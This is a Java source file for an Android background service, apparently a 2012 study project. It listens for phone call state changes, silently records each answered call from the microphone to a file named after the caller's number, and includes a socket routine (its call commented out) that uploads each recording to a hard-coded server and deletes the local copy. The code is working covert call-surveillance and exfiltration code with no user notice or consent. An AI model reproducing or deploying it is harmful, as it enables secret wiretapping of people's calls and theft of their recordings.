package com.eryansky.study.service;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.eryansky.study.util.FileUtil;
import com.eryansky.study.util.StreamTool;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * 电话监听（存放sd卡、socket方式上传网络服务器）
 * Nexus S(i9020/i9023)底层驱动屏蔽 导致无法录音
 * @author 尔演&Eryan eryanwcp@163.com
 * @date 2012-4-19 下午02:05:20
 */
public class PhoneListenerService extends Service {
	
	private static final String TAG = "PhoneListenerService";
	private static final String DIR = "PhoneListaner";//存放文件夹

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}
	
	private final class PhoneListener extends PhoneStateListener{
		private String incomingNumber = "0";
		private File file;
		private MediaRecorder mediaRecorder;
		
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING://来电
					this.incomingNumber = incomingNumber;
					break;

				case TelephonyManager.CALL_STATE_OFFHOOK://接通电话
					SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMddHHmm");
					final String dirPath = Environment.getExternalStorageDirectory()+ File.separator + DIR;
					if(FileUtil.hasSdcard()){
						if(FileUtil.createFolder(dirPath)){
							file = new File(dirPath, 
									this.incomingNumber + "_" + dateFormat.format(new Date()) + ".3gp"); 
						}else{
							Log.e(TAG, "Create folder is fail！");
						}
					}else{
						Log.e(TAG, "sdcard is not exist！");
					}
					
					mediaRecorder = new MediaRecorder();
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//MIC
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//THREE_GPP
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//AMR_NB
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					mediaRecorder.prepare();
					mediaRecorder.start();//开始录音
					break;
					
				case TelephonyManager.CALL_STATE_IDLE://挂断电话后回归到空闲状态
					if(mediaRecorder != null){
						mediaRecorder.stop();
						mediaRecorder.release();
						mediaRecorder = null;
						this.incomingNumber = "";
						//uploadFile();将录音文件上传服务器
					}
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		/**
		 * socket文件上传
		 */
		private void uploadFile() {
			new Thread(new Runnable() {				
				public void run() {
					try {
						if(file!=null && file.exists()){
							Socket socket = new Socket("192.168.1.100", 7878);
				            OutputStream outStream = socket.getOutputStream();
				            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
				            outStream.write(head.getBytes());
				            
				            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
							String response = StreamTool.readLine(inStream);
				            String[] items = response.split(";");
							String position = items[1].substring(items[1].indexOf("=")+1);
							
							RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
							fileOutStream.seek(Integer.valueOf(position));
							byte[] buffer = new byte[1024];
							int len = -1;
							while( (len = fileOutStream.read(buffer)) != -1){
								outStream.write(buffer, 0, len);
							}
							fileOutStream.close();
							outStream.close();
				            inStream.close();
				            socket.close();
				            file.delete();
				            file = null;
			            }
			        } catch (Exception e) {                    
			            e.printStackTrace();
			        }
				}
			}).start();
		}		
	}
}
